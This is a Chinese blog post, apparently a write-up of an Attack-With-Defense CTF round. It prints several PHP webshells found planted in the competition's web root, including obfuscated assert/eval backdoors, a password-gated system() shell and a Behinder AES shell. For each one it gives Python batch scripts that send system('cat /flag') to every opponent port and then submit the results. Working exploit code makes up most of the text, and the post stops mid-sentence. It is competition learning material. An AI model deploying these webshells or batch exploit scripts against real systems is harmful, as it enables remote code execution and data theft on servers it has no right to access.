<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="煤矿路口西">
    
    <title>
        
            AWD-1 |
        
        The blog of mklkx
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/favicon.svg">
    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"mklkx.github.io","root":"/","language":"zh-CN","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpg","favicon":"/images/favicon.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":"enable","background_img":"/images/bg.svg","description":"(⌐■_■)"},"scroll":{"progress_bar":{"enable":"enable"},"percent":{"enable":"enable"}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="The blog of mklkx" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                The blog of mklkx
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">AWD-1</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/logo.jpg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">煤矿路口西</span>
                        
                            <span class="author-label">Lv3</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;2021-03-22 20:56:06
    </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/AWD/">AWD</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>2.5k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>13 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h3><span id="simple">simple</span></h3>
<hr>
<p><strong>启示：新收获，体会到了AWD的乐趣</strong></p>
<blockquote>
<p>尽管笔者还是很菜，但是事后学会写批量化脚本成功后，还是体会到了AWD的乐趣，有点意思~</p>
</blockquote>
<hr>
<h4><span id="准备工作"><strong>准备工作：</strong></span></h4>
<p>通过WinSCP（Xshell等）连接登录后，备份/var/www/html，将此目录下的所有文件拖入D盾，发现部分漏洞。👇</p>
<p><img lazyload src="/images/loading.svg" data-src="DLnYgx.jpg" alt="D盾"></p>
<p>挨个修叭</p>
<hr>
<h4><span id="1"><em>1</em></span></h4>
<h5><span id="config_commonphp"><strong>.config_common.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$a&#x3D;base64_decode(&quot;Y&quot;.&quot;X&quot;.&quot;N&quot;.&quot;z&quot;.&quot;Z&quot;.&quot;X&quot;.&quot;J&quot;.&quot;0&quot;);</span><br><span class="line">$a(@$&#123;&quot;_P&quot;.&quot;O&quot;.&quot;S&quot;.&quot;T&quot;&#125;[520]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>简单分行后，将’YXNzZXJ0’进行base64加密后得’assert’,即assert(@$_POST[520]);，意为传入一个名为520的变量，方式为POST传参，后以PHP代码的方式执行。</p>
<p>因此，在网站上尝试POST传参’520=system(‘cat /flag’);'后可得flag。👇</p>
<p><img lazyload src="/images/loading.svg" data-src="DLnGCR.jpg" alt="config_common"></p>
<p>接下来就是批量化的过程，明确思路：</p>
<p>1.攻击端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port_start&#x3D;8801</span><br><span class="line">port_end&#x3D;8808</span><br><span class="line">my_port&#x3D;8802</span><br><span class="line">flag&#x3D;[]</span><br><span class="line">token&#x3D;&#39;1f208fe1a06b1d6db7ff6b7a7db3aefe&#39;</span><br></pre></td></tr></table></figure>
<p>2.获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def config_common(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;.config_common.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;520&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<p>3.提交flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in range(port_start,port_end+1):</span><br><span class="line">    if(i&#x3D;&#x3D;my_port):</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        config_common(i)</span><br><span class="line">        #pdd(i)</span><br><span class="line">        #function111(i)</span><br><span class="line">        #function4eff2(i)</span><br><span class="line">        #ciscn_notes(i)</span><br><span class="line">        #ciscn_config2(i)</span><br><span class="line">        #ciscn_include2(i)</span><br><span class="line">        #ciscn_url(i)</span><br><span class="line">        #ciscn_include(i)#冰蝎</span><br><span class="line">        #ciscn_config1(i)</span><br><span class="line">        submit_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:9090&#x2F;&#39;</span><br><span class="line">        for i in flag:</span><br><span class="line">            submit_flag&#x3D;&#123;&#39;flag&#39;:i,&#39;token&#39;:token&#125;</span><br><span class="line">            requests.post(url&#x3D;submit_url,data&#x3D;submit_flag)</span><br><span class="line">time.sleep(60*5)</span><br></pre></td></tr></table></figure>
<p>其中还包括异常处理的部分，可逐步完善。</p>
<hr>
<h4><span id="2"><em>2</em></span></h4>
<h5><span id="pddphp"><strong>pdd.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_REQUEST[&quot;pdsdt&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>与第一题大同小异，网页命令同为’pdsdt=system(‘cat /flag’);’</p>
<p>贴脚本，相同部分不再赘述：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def pdd(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;pdd.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pdsdt&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="3"><em>3</em></span></h4>
<h5><span id="111php"><strong>111.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pass&#x3D;$_POST[&quot;password&quot;];</span><br><span class="line">if($pass &#x3D;&#x3D; &quot;4eff2c041976ea22afb7092a53188c70&quot;)</span><br><span class="line">	&#123;</span><br><span class="line">		system($_GET[&quot;getshell&quot;]);</span><br><span class="line">		readfile(&quot;&#x2F;flag&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;be1c5ff7101b7791469b5df2315cf75a&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>POST传入一个名为password的变量赋值给pass，若该变量（password=&gt;pass）==“4eff2c041976ea22afb7092a53188c70”,则系统自动返回根目录下flag的操作；若不是，则返回假的flag。</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function111(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;.111.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;password&quot;:&quot;4eff2c041976ea22afb7092a53188c70&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="4"><em>4</em></span></h4>
<h5><span id="4eff2c041976ea22afb7092a53188c70php"><strong>4eff2c041976ea22afb7092a53188c70.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_POST[&quot;cmd&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>同第一第二题，脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def function4eff2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;uploads&#x2F;4eff2c041976ea22afb7092a53188c70.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cmd&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="5"><em>5</em></span></h4>
<h5><span id="ciscn_urlphp"><strong>ciscn_url.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">$parts &#x3D; parse_url($url);</span><br><span class="line">if(empty($parts[&#39;host&#39;]) || $parts[&#39;host&#39;] !&#x3D; &#39;localhost&#39;) &#123;</span><br><span class="line">    exit(&#39;error&#39;);</span><br><span class="line">&#125;</span><br><span class="line">readfile($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>与之前不同，此为get传参一个名为url的变量，赋值给了url，经过解析后传给了parts变量，若parts变量的host部分为空或不等于’localhost’，则error。故明确该命令的正确形式应该为’?url=file://localhost/flag’</p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_url(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_url.php?&#39;</span><br><span class="line">    payload &#x3D; &#123;&quot;url&quot;:&quot;file:&#x2F;&#x2F;localhost&#x2F;flag&quot;&#125;</span><br><span class="line">    req &#x3D; requests.get(url&#x3D;attack_url,params&#x3D;payload)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="6"><em>6</em></span></h4>
<h5><span id="ciscn_notesphp"><strong>ciscn_notes.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">include(&#39;ciscn_config.php&#39;);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id &#x3D; mysql_real_escape_string($_GET[&#39;id&#39;]);</span><br><span class="line">    if(isset($_GET[&#39;topic&#39;]))&#123;</span><br><span class="line">        $topic &#x3D; mysql_real_escape_string($_GET[&#39;topic&#39;]);</span><br><span class="line">        $topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $topic &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id);</span><br><span class="line">    $result &#x3D; mysql_query($sql,$con);</span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">    if(isset($row[&#39;topic&#39;])&amp;&amp;isset($row[&#39;substance&#39;]))&#123;</span><br><span class="line">        echo &quot;&lt;h1&gt;&quot;.$row[&#39;topic&#39;].&quot;&lt;&#x2F;h1&gt;&lt;br&gt;&quot;.$row[&#39;substance&#39;];</span><br><span class="line">        die();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;You&#39;re wrong!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ciscn_nt &#123;</span><br><span class="line">    var $a;</span><br><span class="line">    var $b;</span><br><span class="line">    function __construct($a,$b) &#123;</span><br><span class="line">        $this-&gt;a&#x3D;$a;</span><br><span class="line">        $this-&gt;b&#x3D;$b;</span><br><span class="line">    &#125;</span><br><span class="line">    function test() &#123;</span><br><span class="line">       array_map($this-&gt;a,$this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p1&#x3D;new ciscn_nt(assert,array($_POST[&#39;x&#39;]));</span><br><span class="line">$p1-&gt;test();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;myblog&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;..&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;nav class&#x3D;&quot;navbar navbar-default&quot; role&#x3D;&quot;navigation&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">        &lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Blog&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">            &lt;li class&#x3D;&quot;active&quot;&gt;&lt;a href&#x3D;&quot;#&quot;&gt;笔记&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href&#x3D;&quot;#&quot;&gt;关于&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;&lt;&#x2F;nav&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;panel panel-success&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-heading&quot;&gt;</span><br><span class="line">        &lt;h1 class&#x3D;&quot;panel-title&quot;&gt;php是世界上最好的语言&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;panel-body&quot;&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;1&amp;topic&#x3D;Welcome to PHP world&#39;&gt;Welcome to PHP world&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;2&amp;topic&#x3D;Do the best you can&#39;&gt;Do the best you can&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href&#x3D;&#39;ciscn_notes.php?id&#x3D;3&amp;topic&#x3D;Attention, please.&#39;&gt;格式化，全都格式化。。。&lt;&#x2F;a&gt;&lt;br&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--mysql_real_escape_string()--&gt;</span><br><span class="line">&lt;!--$topic &#x3D; sprintf(&quot;AND topic&#x3D;&#39;%s&#39;&quot;, $topic);--&gt;</span><br><span class="line">&lt;!--$sql &#x3D; sprintf(&quot;SELECT * FROM notes WHERE id&#x3D;&#39;%s&#39; $topic&quot;, $id)--&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>观察可得该网页的php部分有一明显洞，为POST传入一个名为x的变量.</p>
<blockquote>
<p>但需要注意的是，由于该部分返回的req.text不止flag部分，故需对获得的数据做进一步处理才行</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="DLn359.jpg" alt="notes"></p>
<p>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_notes(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_notes.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[1][0:32]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure>
<h4><span id="7"><em>7</em></span></h4>
<h5><span id="ciscn_includephp"><strong>ciscn_include.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>该处可通过冰蝎连接以及COOKIE传参一个名为cookie的变量’cookie=system(‘cat /flag’);'可得：</p>
<p>(1)冰蝎连接👇</p>
<p><img lazyload src="/images/loading.svg" data-src="DLnJ81.jpg" alt="bx"></p>
<p>批量脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#冰蝎</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line"></span><br><span class="line">def padding_zero(key) -&gt; bytes:</span><br><span class="line">    output &#x3D; list(key)</span><br><span class="line">    while len(output) % 16:</span><br><span class="line">        output.append(&#39;\x00&#39;)</span><br><span class="line">    return &#39;&#39;.join(output).encode()</span><br><span class="line"></span><br><span class="line">def padding_pkcs5(msg) -&gt; bytes:</span><br><span class="line">    if isinstance(msg, str):</span><br><span class="line">        msg &#x3D; msg.encode()</span><br><span class="line">    if len(msg) &#x3D;&#x3D; 0x10:</span><br><span class="line">        return msg + b&#39;\x10&#39; * 0x10</span><br><span class="line">    return msg + (</span><br><span class="line">        0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()</span><br><span class="line"></span><br><span class="line">def aes_encrypt(msg, key) -&gt; str:</span><br><span class="line">    key&#x3D;padding_zero(key)</span><br><span class="line">    enc &#x3D; AES.new(key, AES.MODE_CBC, b&#39;\x00&#39; * 16)</span><br><span class="line">    return base64.b64encode(enc.encrypt(padding_pkcs5(msg))).decode()</span><br><span class="line"></span><br><span class="line">def get_key(url):</span><br><span class="line">    Getparams&#x3D;&#123;&quot;pass&quot;:&quot;1&quot;&#125;</span><br><span class="line">    key &#x3D; session.get(url,params&#x3D;Getparams).content</span><br><span class="line">    key &#x3D; str(key, encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    return key</span><br><span class="line"></span><br><span class="line">def main_exec(url,command,key):</span><br><span class="line">    command &#x3D; bytes(command, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line">    command_b64&#x3D; str(base64.b64encode(command), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def main_exec_encode(url,command,key):</span><br><span class="line">    command2 &#x3D; &quot;ob_start();&quot;+command+&quot;$flag &#x3D; ob_get_contents();ob_end_clean();for($i&#x3D;0;$i&lt;10;$i++)&#123;$flag&#x3D;bin2hex($flag);$flag&#x3D;base64_encode($flag);&#125;print($flag);&quot;</span><br><span class="line">    command2 &#x3D; bytes(command2, encoding &#x3D; &quot;utf8&quot;)</span><br><span class="line"></span><br><span class="line">    command_b64 &#x3D; str(base64.b64encode(command2), encoding &#x3D; &quot;utf-8&quot;)</span><br><span class="line">    command_eval&#x3D;&quot;assert|eval(base64_decode(&#39;&#123;&#125;&#39;));&quot;.format(command_b64)</span><br><span class="line">    postdata&#x3D;aes_encrypt(command_eval,key)</span><br><span class="line"></span><br><span class="line">    res&#x3D;session.post(url,data&#x3D;postdata).content</span><br><span class="line"></span><br><span class="line">    for i in range(10):</span><br><span class="line">        res &#x3D; base64.b64decode(res)</span><br><span class="line">        res &#x3D; codecs.decode(res,&quot;hex&quot;)</span><br><span class="line">        return res</span><br><span class="line">    </span><br><span class="line">def ciscn_include(i):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;XXX:&quot;+str(i)+&quot;&#x2F;blog&#x2F;ciscn_include.php&quot;</span><br><span class="line">    command &#x3D; &quot;system(&#39;cat &#x2F;flag&#39;);&quot;</span><br><span class="line">    key &#x3D; &quot;e45e329feb5d925b&quot;</span><br><span class="line">    flag &#x3D; main_exec(url,command,key)</span><br><span class="line">    #flag2 &#x3D; main_exec_encode(url,command,key)</span><br><span class="line">    #flag&#x3D;(flag_[2:-1])</span><br><span class="line">    print(flag)</span><br><span class="line">    #print(flag2)</span><br><span class="line">    </span><br><span class="line">#冰蝎end</span><br></pre></td></tr></table></figure>
<p>(2)COOKIE传参脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_include2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_include.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;cookie&quot;:&quot;&#x2F;flag&quot;&#125;</span><br><span class="line">    req&#x3D;requests.get(url&#x3D;attack_url,cookies&#x3D;data)</span><br><span class="line">    print(req.text)</span><br><span class="line">    flag.append(req.text)</span><br><span class="line">    #print(flag)</span><br><span class="line">    exception(req)</span><br></pre></td></tr></table></figure>
<hr>
<h4><span id="8"><em>8</em></span></h4>
<h5><span id="ciscn_configphp"><strong>ciscn_config.php</strong></span></h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Mysql閾炬帴閰嶇疆&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$con &#x3D; mysql_connect (&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;c933ccc3b6b2fe8cb830a5e76f5f98a5&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">  print(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysql_select_db(&quot;ciscn_web&quot;, $con);</span><br><span class="line"></span><br><span class="line">forward_static_call_array(assert,array($_POST[&quot;x&quot;]));</span><br><span class="line">class c</span><br><span class="line">&#123;</span><br><span class="line">        public $code &#x3D; null;</span><br><span class="line">        public $decode &#x3D; null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;       $this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">                $this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">                @Eval($this-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">new c();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>第一个洞在这个部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;code&#x3D;&#39;ZXZhbCgkX1BPU1RbcGFzc10pOw&#x3D;&#x3D;&#39;;</span><br><span class="line">$this-&gt;decode &#x3D; @base64_decode( $this-&gt;code );</span><br><span class="line">@Eval($this-&gt;decode);</span><br></pre></td></tr></table></figure>
<p>将一串字符串赋值给$this-&gt;code(可简单理解为一个变量);将该变量进行base64解码后，赋值给$this-&gt;decode;将此变量当作php代码执行。</p>
<p>因此，我们需要将此字符串进行base64解密，得’eval($_POST[pass]);’</p>
<p>此后操作与第一第二相同，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config1(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pass&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>第二个洞为POST传参一个名为x的参数：</p>
